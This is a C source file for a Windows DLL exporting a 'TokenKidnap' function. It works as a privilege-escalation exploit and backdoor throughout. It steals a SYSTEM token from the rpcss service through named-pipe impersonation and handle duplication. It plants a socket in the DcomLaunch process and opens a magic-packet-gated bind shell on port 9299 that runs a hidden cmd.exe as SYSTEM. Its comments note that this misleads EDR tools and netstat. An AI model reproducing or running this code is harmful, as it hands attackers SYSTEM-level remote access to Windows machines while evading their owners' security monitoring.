#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <winternl.h>

GUID GuidAcceptEx = WSAID_ACCEPTEX;
LPFN_ACCEPTEX lpfnAcceptEx = NULL;
GUID GuidTransmit = WSAID_TRANSMITPACKETS;
LPFN_TRANSMITPACKETS lpfnTransmitPackets;
TP_CALLBACK_ENVIRON CallBackEnviron;

VOID DbgPrintEx(ULONG, ULONG, PCCH, ...);

#define ProcessHandleInformation (PROCESSINFOCLASS)51

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONGLONG HandleCount;
    ULONGLONG PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONGLONG NumberOfHandles;
    ULONGLONG Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _ACCEPT_BUFFER
{
    CHAR Data[16];
    SOCKADDR_STORAGE DestAddress;
    SOCKADDR_STORAGE SourceAddress;
} ACCEPT_BUFFER, *PACCEPT_BUFFER;

typedef struct _ACCEPT_CONTEXT
{
    PACCEPT_BUFFER Buffer;
    ULONG_PTR BufferSize;
    HANDLE ParentHandle;
    HANDLE AcceptSocket;
    SOCKET ListenSocket;
    SOCKET LocalSocket;
} ACCEPT_CONTEXT, *PACCEPT_CONTEXT;

HRESULT
SendAcceptResponse (
    _In_ PACCEPT_CONTEXT Context,
    _In_ PCHAR Response
    )
{
    TRANSMIT_PACKETS_ELEMENT packets;
    BOOL bRes;

    //
    // Send the input string back as a response, then convert the error, if any
    //
    packets.dwElFlags = TP_ELEMENT_MEMORY;
    packets.cLength = (ULONG)strlen(Response);
    packets.pBuffer = Response;
    bRes = lpfnTransmitPackets(Context->LocalSocket,
                               &packets,
                               1,
                               0,
                               NULL,
                               TF_USE_KERNEL_APC);
    if (bRes == FALSE)
    {
        return HRESULT_FROM_WIN32(GetLastError());
    }
    return ERROR_SUCCESS;
}

VOID
DbgPrintConnectionData (
    _In_ PACCEPT_CONTEXT Context
    )
{
    WCHAR localNodeName[128];
    WCHAR localServName[128];
    WCHAR remoteNodeName[128];
    WCHAR remoteServName[128];

    //
    // Get the local name. Ignore failure as this is only for debugging
    //
    GetNameInfoW((const SOCKADDR*)&Context->Buffer->SourceAddress,
                 sizeof(Context->Buffer->SourceAddress),
                 localNodeName,
                 sizeof(localNodeName),
                 localServName,
                 sizeof(localServName),
                 0);

    //
    // Get the local name. Ignore failure as this is only for debugging
    //
    GetNameInfoW((const SOCKADDR*)&Context->Buffer->DestAddress,
                 sizeof(Context->Buffer->DestAddress),
                 remoteNodeName,
                 sizeof(remoteNodeName),
                 remoteServName,
                 sizeof(remoteServName),
                 0);

    //
    // Print debugging information
    //
    DbgPrintEx(77,
               0,
               "Magic packet of %d bytes received (%s) from %S:%S to %S:%S\n",
               Context->BufferSize,
               Context->Buffer->Data,
               remoteNodeName,
               remoteServName,
               localNodeName,
               localServName);
}

HRESULT
ValidateMagicPacket (
    _In_ PACCEPT_CONTEXT Context
    )
{
    static CONST CHAR k_MagicPacket[] = "\n";
    static INT k_MagicPacketSize = sizeof(k_MagicPacket) - 1;

    //
    // Make sure we even have enough bytes to check for
    //
    if (Context->BufferSize != k_MagicPacketSize)
    {
        return HRESULT_FROM_WIN32(ERROR_INCORRECT_SIZE);
    }

    //
    // We do, so scan the buffer
    //
    if (RtlCompareMemory(Context->Buffer, k_MagicPacket, k_MagicPacketSize) !=
        k_MagicPacketSize)
    {
        return HRESULT_FROM_WIN32(ERROR_WRONG_PASSWORD);
    }

    //
    // All good otherwise
    //
    return ERROR_SUCCESS;
}

VOID
CALLBACK
AcceptCallback (
    _Inout_ PTP_CALLBACK_INSTANCE Instance,
    _Inout_ PVOID Context,
    _Inout_opt_ PVOID Overlapped,
    _In_ ULONG IoResult,
    _In_ ULONG_PTR NumberOfBytesTransferred,
    _Inout_ PTP_IO Io
    )
{
    STARTUPINFOEX startupInfoEx;
    PROCESS_INFORMATION processInfo;
    SIZE_T listSize;
    BOOL bRes;
    PPROC_THREAD_ATTRIBUTE_LIST procList;
    PACCEPT_CONTEXT acceptContext;
    HRESULT hResult;

    //
    // Handle cleanup
    //
    UNREFERENCED_PARAMETER(Io);
    UNREFERENCED_PARAMETER(IoResult);
    UNREFERENCED_PARAMETER(Overlapped);
    procList = NULL;

    //
    // Now we know how many bytes were written at connection time, save that
    //
    acceptContext = Context;
    acceptContext->BufferSize = NumberOfBytesTransferred;

    //
    // Ignore random port scanning/connection attempts by making sure we have
    // a valid "magic packet" that was sent to us first.
    //
    hResult = ValidateMagicPacket(acceptContext);
    if (FAILED(hResult))
    {
        //
        // If there's no magic packet, we send no data back
        //
        goto EndConnection;
    }

    //
    // For debugging, print out the client information
    //
    DbgPrintConnectionData(acceptContext);

    //
    // Figure out the size we need for one attribute (this should always fail)
    //
    bRes = InitializeProcThreadAttributeList(NULL, 1, 0, &listSize);
    if (bRes != FALSE)
    {
        goto EndConnection;
    }

    //
    // Then allocate it
    //
    procList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, listSize);
    if (procList == NULL)
    {
        //
        // Tell client the target system is out of memory
        //
        SendAcceptResponse(acceptContext, "OOM1\n");
        goto EndConnection;
    }

    //
    // Re-initialize the list again
    //
    bRes = InitializeProcThreadAttributeList(procList, 1, 0, &listSize);
    if (bRes == FALSE)
    {
        //
        // Tell client the attribute list failed
        //
        SendAcceptResponse(acceptContext, "PAT1\n");
        goto EndConnection;
    }

    //
    // Now set the DcomLaunch process as the parent
    //
    bRes = UpdateProcThreadAttribute(procList,
                                     0,
                                     PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                     &acceptContext->ParentHandle,
                                     sizeof(acceptContext->ParentHandle),
                                     NULL,
                                     NULL);
    if (bRes == FALSE)
    {
        //
        // Tell client the attribute list failed
        //
        SendAcceptResponse(acceptContext, "PAT2\n");
        goto EndConnection;
    }

    //
    // Let client know we're ready to launch the bind shell
    //
    SendAcceptResponse(acceptContext, "[+] Welcome to SYSTEM shell !!!\n");

    //
    // Initialize the startup info structure to say that we want to:
    //
    //  1) Hide the window
    //  2) Use the socket as standard in/out/error
    //  3) Use an attribute list
    //
    // Then, spawn the process, again making sure there's no window, and
    // indicating that we have extended attributes.
    //
    RtlZeroMemory(&startupInfoEx, sizeof(startupInfoEx));
    startupInfoEx.StartupInfo.cb = sizeof(startupInfoEx);
    startupInfoEx.StartupInfo.wShowWindow = SW_HIDE;
    startupInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW |
                                        STARTF_USESTDHANDLES;
    startupInfoEx.StartupInfo.hStdInput = (HANDLE)acceptContext->AcceptSocket;
    startupInfoEx.StartupInfo.hStdOutput = (HANDLE)acceptContext->AcceptSocket;
    startupInfoEx.StartupInfo.hStdError = (HANDLE)acceptContext->AcceptSocket;
    startupInfoEx.lpAttributeList = procList;
    bRes = CreateProcess(L"c:\\windows\\system32\\cmd.exe",
                          NULL,
                          NULL,
                          NULL,
                          TRUE,
                          CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                          NULL,
                          NULL,
                          &startupInfoEx.StartupInfo,
                          &processInfo);
    if (bRes == FALSE)
    {
        //
        // Tell client the process launch failed
        //
        SendAcceptResponse(acceptContext, "PROC1\n");
        goto EndConnection;
    }

    //
    // We never care about the main thread
    //
    CloseHandle(processInfo.hThread);

    //
    // We can now close the local socket -- the connection is also owned by the
    // injected socket, and we don't need to send any more data ourselves. Then
    // close the listen socket, as we have a happy client now.
    //
    closesocket(acceptContext->LocalSocket);
    acceptContext->LocalSocket = 0;
    closesocket(acceptContext->ListenSocket);
    acceptContext->ListenSocket = 0;

    //
    // At this point, wait until this client disconnects
    //
    CallbackMayRunLong(Instance);
    WaitForSingleObject(processInfo.hProcess, INFINITE);
    CloseHandle(processInfo.hProcess);

EndConnection:
    //
    // Free the attribute list if needed
    //
    if (procList != NULL)
    {
        HeapFree(GetProcessHeap(), 0, procList);
    }
}

HRESULT
GetTokenObjectIndex (
    _Out_ PULONG TokenIndex
    )
{
    HANDLE hToken;
    BOOL bRes;
    NTSTATUS status;
    struct
    {
        OBJECT_TYPE_INFORMATION TypeInfo;
        WCHAR TypeNameBuffer[sizeof("Token")];
    } typeInfoWithName;

    //
    // Open the current process token
    //
    bRes = OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken);
    if (bRes == FALSE)
    {
        return HRESULT_FROM_WIN32(GetLastError());
    }

    //
    // Get the object type information for the token handle
    //
    status = NtQueryObject(hToken,
                           ObjectTypeInformation,
                           &typeInfoWithName,
                           sizeof(typeInfoWithName),
                           NULL);
    CloseHandle(hToken);
    if (!NT_SUCCESS(status))
    {
        return HRESULT_FROM_NT(status);
    }

    //
    // Return the object type index
    //
    *TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
    return ERROR_SUCCESS;
}

HRESULT
GetSystemTokenFromProcess (
    _In_ HANDLE ProcessHandle
    )
{
    NTSTATUS status;
    PROCESS_HANDLE_SNAPSHOT_INFORMATION localInfo;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION handleInfo = &localInfo;
    ULONG bytes;
    ULONG tokenIndex;
    ULONG i;
    HRESULT hResult;
    BOOL bRes;
    HANDLE dupHandle;
    TOKEN_STATISTICS tokenStats;
    HANDLE hThread;
    LUID systemLuid = SYSTEM_LUID;

    //
    // Get the Object Type Index for Token Objects so we can recognize them
    //
    hResult = GetTokenObjectIndex(&tokenIndex);
    if (FAILED(hResult))
    {
        goto Failure;
    }

    //
    // Check how big the process handle list ist
    //
    status = NtQueryInformationProcess(ProcessHandle,
                                       ProcessHandleInformation,
                                       handleInfo,
                                       sizeof(*handleInfo),
                                       &bytes);
    if (NT_SUCCESS(status))
    {
        hResult = ERROR_UNIDENTIFIED_ERROR;
        goto Failure;
    }

    //
    // Add space for 16 more handles and try again
    //
    bytes += 16 * sizeof(*handleInfo);
    handleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
    status = NtQueryInformationProcess(ProcessHandle,
                                       ProcessHandleInformation,
                                       handleInfo,
                                       bytes,
                                       NULL);
    if (!NT_SUCCESS(status))
    {
        hResult = HRESULT_FROM_NT(status);
        goto Failure;
    }

    //
    // Enumerate each one
    //
    for (i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        //
        // Check if it's a token handle with full access
        //
        if ((handleInfo->Handles[i].ObjectTypeIndex == tokenIndex) &&
            (handleInfo->Handles[i].GrantedAccess == TOKEN_ALL_ACCESS))
        {
            //
            // Duplicate the token so we can take a look at it
            //
            bRes = DuplicateHandle(ProcessHandle,
                                   handleInfo->Handles[i].HandleValue,
                                   GetCurrentProcess(),
                                   &dupHandle,
                                   0,
                                   FALSE,
                                   DUPLICATE_SAME_ACCESS);
            if (bRes == FALSE)
            {
                hResult = HRESULT_FROM_WIN32(GetLastError());
                goto Failure;
            }

            //
            // Get information on the token
            //
            bRes = GetTokenInformation(dupHandle,
                                       TokenStatistics,
                                       &tokenStats,
                                       sizeof(tokenStats),
                                       &bytes);
            if (bRes == FALSE)
            {
                CloseHandle(dupHandle);
                hResult = HRESULT_FROM_WIN32(GetLastError());
                goto Failure;
            }

            //
            // Check if its a system token with all of its privileges intact
            //
            if ((*(PULONGLONG)&tokenStats.AuthenticationId ==
                 *(PULONGLONG)&systemLuid) &&
                (tokenStats.PrivilegeCount >= 22))
            {
                //
                // We have a good candidate, impersonate it!
                //
                hThread = GetCurrentThread();
                bRes = SetThreadToken(&hThread, dupHandle);

                //
                // Always close the handle since it's not needed
                //
                CloseHandle(dupHandle);
                if (bRes == FALSE)
                {
                    hResult = HRESULT_FROM_WIN32(GetLastError());
                    goto Failure;
                }

                //
                // Get out of the loop
                //
                hResult = ERROR_SUCCESS;
                break;
            }

            //
            // Close this token and move on to the next one
            //
            CloseHandle(dupHandle);
        }
    }

Failure:
    //
    // Free the handle list if we had one
    //
    if (handleInfo != &localInfo)
    {
        HeapFree(GetProcessHeap(), 0, handleInfo);
    }
    return hResult;
}

HRESULT
GetServiceHandle (
    _In_ LPCWSTR ServiceName,
    _Out_ PHANDLE ProcessHandle
    )
{
    SC_HANDLE hScm, hRpc;
    BOOL bRes;
    SERVICE_STATUS_PROCESS procInfo;
    HRESULT hResult;
    DWORD dwBytes;
    HANDLE hProc;

    //
    // Prepare for cleanup
    //
    hScm = NULL;
    hRpc = NULL;

    //
    // Connect to the SCM
    //
    hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hScm == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Open the service
    //
    hRpc = OpenService(hScm, ServiceName, SERVICE_QUERY_STATUS);
    if (hRpc == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Query the process information
    //
    bRes = QueryServiceStatusEx(hRpc,
                                SC_STATUS_PROCESS_INFO,
                                (LPBYTE)&procInfo,
                                sizeof(procInfo),
                                &dwBytes);
    if (bRes == FALSE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Open a handle for all access to the PID
    //
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
    if (hProc == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Return the PID
    //
    *ProcessHandle = hProc;
    hResult = ERROR_SUCCESS;

Failure:
    //
    // Cleanup the handles
    //
    if (hRpc != NULL)
    {
        CloseServiceHandle(hRpc);
    }
    if (hScm != NULL)
    {
        CloseServiceHandle(hScm);
    }
    return hResult;
}

HRESULT
GetRpcssToken (
    VOID
    )
{
    HANDLE hPipe, hPipe2;
    BOOL bRes;
    HRESULT hResult;

    //
    // Prepare for cleanup
    //
    hPipe = INVALID_HANDLE_VALUE;
    hPipe2 = INVALID_HANDLE_VALUE;

    //
    // Create the server pipe
    //
    hPipe = CreateNamedPipe(L"\\\\.\\pipe\\pipey",
                            PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
                            PIPE_TYPE_BYTE |
                            PIPE_READMODE_BYTE |
                            PIPE_WAIT |
                            PIPE_ACCEPT_REMOTE_CLIENTS,
                            PIPE_UNLIMITED_INSTANCES,
                            4096,
                            4096,
                            NMPWAIT_USE_DEFAULT_WAIT,
                            NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Create the client end
    //
    hPipe2 = CreateFile(L"\\\\localhost\\pipe\\pipey",
                        GENERIC_READ | GENERIC_WRITE,
                        0,
                        NULL,
                        OPEN_EXISTING,
                        0,
                        NULL);
    if (hPipe2 == INVALID_HANDLE_VALUE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Have the client write in the pipe -- the data doesn't matter
    //
    bRes = WriteFile(hPipe2, &hPipe, sizeof(hPipe2), NULL, NULL);
    if (bRes == FALSE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Now the server reads it back
    //
    bRes = ReadFile(hPipe, &hPipe, sizeof(hPipe), NULL, NULL);
    if (bRes == FALSE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // And finally we impersonate
    //
    bRes = ImpersonateNamedPipeClient(hPipe);
    if (bRes == FALSE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    hResult = ERROR_SUCCESS;

Failure:
    //
    // Cleanup the handles
    //
    if (hPipe != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hPipe);
    }
    if (hPipe2 != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hPipe2);
    }
    return hResult;
}

VOID
CALLBACK
WorkCallback (
    _Inout_ PTP_CALLBACK_INSTANCE Instance,
    _Inout_opt_ PVOID Context,
    _Inout_ PTP_WORK Work
    )
{
    BOOL bRes;
    DWORD bytes;
    INT sockErr;
    PTP_IO tpIo;
    ACCEPT_BUFFER acceptBuffer;
    SOCKET listenSocket;
    SOCKET localSocket;
    OVERLAPPED overlapped;
    PADDRINFOW pResult;
    ADDRINFOW addrHints;
    PACCEPT_CONTEXT acceptContext;
    HANDLE hProc;
    HRESULT hResult;
    BOOLEAN needRevert;
    WSADATA wsaData;
    HANDLE parentHandle;
    HANDLE newSocket;

    //
    // Prepare for cleanup
    //
    UNREFERENCED_PARAMETER(Work);
    UNREFERENCED_PARAMETER(Instance);
    needRevert = FALSE;
    acceptContext = NULL;
    newSocket = NULL;
    parentHandle = NULL;
    listenSocket = 0;
    localSocket = 0;
    tpIo = NULL;

    //
    // Get the original token for NETWORK_SERVICE, which happens to be the one
    // initially created for the RpcSs service
    //
    hResult = GetRpcssToken();
    if (FAILED(hResult))
    {
        goto Failure;
    }

    //
    // At this point we have an impersonation token, which we need to let go of
    // on failure (or success for that matter)
    //
    needRevert = TRUE;

    //
    // Now open a handle to RPCSS
    //
    hResult = GetServiceHandle(L"rpcss", &hProc);
    if (FAILED(hResult))
    {
        goto Failure;
    }

    //
    // And now impersonate SYSTEM from one of the tokens RPCSS has open. Close
    // handle in all cases, since it's no longer needed.
    //
    hResult = GetSystemTokenFromProcess(hProc);
    CloseHandle(hProc);
    if (FAILED(hResult))
    {
        goto Failure;
    }

    //
    // Initialize Winsock 2.2
    //
    RtlZeroMemory(&wsaData, sizeof(wsaData));
    sockErr = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (sockErr != ERROR_SUCCESS)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Create the listen socket
    //
    listenSocket = WSASocket(AF_INET,
                             SOCK_STREAM,
                             IPPROTO_TCP,
                             NULL,
                             0,
                             WSA_FLAG_OVERLAPPED);
    if (listenSocket == INVALID_SOCKET)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Create the accept socket
    //
    localSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (localSocket == INVALID_SOCKET)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Get the address of WSAAcceptEx
    //
    sockErr = WSAIoctl(listenSocket,
                       SIO_GET_EXTENSION_FUNCTION_POINTER,
                       &GuidAcceptEx,
                       sizeof(GuidAcceptEx),
                       &lpfnAcceptEx,
                       sizeof(lpfnAcceptEx),
                       &bytes,
                       NULL,
                       NULL);
    if (sockErr != ERROR_SUCCESS)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Get the address of TransmitPackets
    //
    sockErr = WSAIoctl(listenSocket,
                       SIO_GET_EXTENSION_FUNCTION_POINTER,
                       &GuidTransmit,
                       sizeof(GuidTransmit),
                       &lpfnTransmitPackets,
                       sizeof(lpfnTransmitPackets),
                       &bytes,
                       NULL,
                       NULL);
    if (sockErr != ERROR_SUCCESS)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Open a handle to DCOM Launch
    //
    hResult = GetServiceHandle(L"DcomLaunch", &parentHandle);
    if (FAILED(hResult))
    {
        goto Failure;
    }

    //
    // Clone the socket into DCOM. With some LSPs, this isn't strictly allowed,
    // but on modern Windows 10, this isn't usually an issue. Additionally, it
    // has the nice benefit of making EDR tools and Process Hacker/netstat/Proc
    // Mon identify the wrong process.
    //
    bRes = DuplicateHandle(GetCurrentProcess(),
                           (HANDLE)localSocket,
                           parentHandle,
                           &newSocket,
                           0,
                           TRUE,
                           DUPLICATE_SAME_ACCESS);
    if (bRes == FALSE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // We don't need the impersonation token anymore, go back to normality
    //
    RevertToSelf();
    needRevert = FALSE;

    //
    // Allocate a context which will hold the first packet from the client,
    // our sockets, the handle to the DCOM process (and its associated socket),
    // and the remote/local addresses.
    //
    acceptContext = HeapAlloc(GetProcessHeap(),
                              HEAP_ZERO_MEMORY,
                              sizeof(*acceptContext));
    if (acceptContext == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Build it all out and send it to the thread pool that will hold our I/O
    //
    acceptContext->AcceptSocket = newSocket;
    acceptContext->ParentHandle = parentHandle;
    acceptContext->Buffer = &acceptBuffer;
    acceptContext->ListenSocket = listenSocket;
    acceptContext->LocalSocket = localSocket;
    tpIo = CreateThreadpoolIo((HANDLE)listenSocket,
                              AcceptCallback,
                              acceptContext,
                              &CallBackEnviron);
    if (tpIo == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Build a SOCKADDR_IN for localhost:9299
    //
    RtlZeroMemory(&addrHints, sizeof(addrHints));
    addrHints.ai_family = AF_INET;
    addrHints.ai_socktype = SOCK_STREAM;
    addrHints.ai_flags = AI_PASSIVE;
    sockErr = GetAddrInfoW(NULL, L"9299", &addrHints, &pResult);
    if (sockErr != ERROR_SUCCESS)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Bind the socket to the address, and free the address info in all cases
    //
    sockErr = bind(listenSocket, pResult->ai_addr, (INT)pResult->ai_addrlen);
    FreeAddrInfoW(pResult);
    if (sockErr != ERROR_SUCCESS)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Start listening for connections 
    //
    sockErr = listen(listenSocket, 100);
    if (sockErr != ERROR_SUCCESS)
    {
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        goto Failure;
    }

    //
    // Pump an I/O in the queue, and begin an asynchronous (overlapped) accept
    //
    StartThreadpoolIo(tpIo);
    RtlZeroMemory(&overlapped, sizeof(overlapped));
    bRes = lpfnAcceptEx(listenSocket,
                        localSocket,
                        &acceptBuffer,
                        sizeof(acceptBuffer.Data),
                        sizeof(acceptBuffer.SourceAddress),
                        sizeof(acceptBuffer.DestAddress),
                        &bytes,
                        &overlapped);

    //
    // If ERROR_IO_PENDING is returned, this is good -- it means the accept
    // callback will be called later. All other errors are fatal.
    //
    if ((bRes == FALSE) && (WSAGetLastError() != ERROR_IO_PENDING))
    {
        //
        // Cancel the pumped I/O we pushed with the StartThreadpoolIo earlier
        //
        hResult = HRESULT_FROM_WIN32(WSAGetLastError());
        CancelThreadpoolIo(tpIo);
        goto Failure;
    }
    else if (bRes != FALSE)
    {
        //
        // Otherwise, this is the success case and the I/O instantly completed,
        // so we need to manually call our callback!
        //
        if (bytes != 0)
        {
            AcceptCallback(NULL, &acceptContext, NULL, 0, bytes, tpIo);
        }
    }

    //
    // Wait for the I/O callback to complete
    //
    WaitForThreadpoolIoCallbacks(tpIo, FALSE);
    hResult = ERROR_SUCCESS;

Failure:
    *(HRESULT*)Context = hResult;
    //
    // Drop impersonation if needed
    //
    if (needRevert != FALSE)
    {
        RevertToSelf();
    }

    //
    // Close the I/O thread pool
    //
    if (tpIo != NULL)
    {
        CloseThreadpoolIo(tpIo);
    }

    //
    // Close the local socket since it's no longer needed. If a client did
    // manage to connect, this won't harm their connection as DCOM now owns it.
    //
    if (localSocket != 0)
    {
        if ((acceptContext == NULL) || (acceptContext->LocalSocket != 0))
        {
            closesocket(localSocket);
        }
    }

    //
    // We also no longer need the listening socket, keeping in mind that the
    // callback may have already killed it
    //
    if (listenSocket != 0)
    {
        if ((acceptContext == NULL) || (acceptContext->ListenSocket != 0))
        {
            closesocket(listenSocket);
        }
    }

    //
    // Close the DCOM handle now
    //
    if (parentHandle != NULL)
    {
        //
        // Close the injected socket, which will disconnect the client, if they
        // did not already disconnect, or kill the connection, in our failure
        // paths.
        //
        if (newSocket != 0)
        {
            bRes = DuplicateHandle(parentHandle,
                                   newSocket,
                                   NULL,
                                   NULL,
                                   0,
                                   FALSE,
                                   DUPLICATE_CLOSE_SOURCE);
        }
        CloseHandle(parentHandle);
    }

    //
    // We don't need the accept context anymore
    //
    if (acceptContext != NULL)
    {
        HeapFree(GetProcessHeap(), 0, acceptContext);
    }
}

__declspec(dllexport)
HRESULT
TokenKidnap (
    _In_ PVOID Blob
    )
{
    PTP_WORK work;
    PTP_POOL pool;
    PTP_CLEANUP_GROUP cleanupGroup;
    HRESULT hResult;

    //
    // Prepare for failure
    //
    UNREFERENCED_PARAMETER(Blob);
    cleanupGroup = NULL;

    //
    // Create the thread pool that we'll use for the work
    //
    pool = CreateThreadpool(NULL);
    if (pool == NULL)
    {
        goto Failure;
    }

    //
    // Create the cleanup group for it
    //
    cleanupGroup = CreateThreadpoolCleanupGroup();
    if (cleanupGroup == NULL)
    {
        goto Failure;
    }

    //
    // Configure the pool
    //
    InitializeThreadpoolEnvironment(&CallBackEnviron);
    SetThreadpoolCallbackPool(&CallBackEnviron, pool);
    SetThreadpoolCallbackCleanupGroup(&CallBackEnviron, cleanupGroup, NULL);

    //
    // For now, always stay in this loop
    //
    while (1)
    {
        //
        // Execute the work callback that will take care of
        //
        work = CreateThreadpoolWork(WorkCallback, &hResult, &CallBackEnviron);
        if (work == NULL)
        {
            goto Failure;
        }

        //
        // Send the work and wait for it to complete
        //
        SubmitThreadpoolWork(work);
        WaitForThreadpoolWorkCallbacks(work, FALSE);
        if (FAILED(hResult))
        {
            break;
        }

        //
        // We're done with this work
        //
        CloseThreadpoolWork(work);
    }

Failure:
    //
    // Cleanup the pool on exit
    //
    if (pool != NULL)
    {
        if (cleanupGroup != NULL)
        {
            CloseThreadpoolCleanupGroup(cleanupGroup);
        }
        DestroyThreadpoolEnvironment(&CallBackEnviron);
        CloseThreadpool(pool);
    }
    return ERROR_SUCCESS;
}


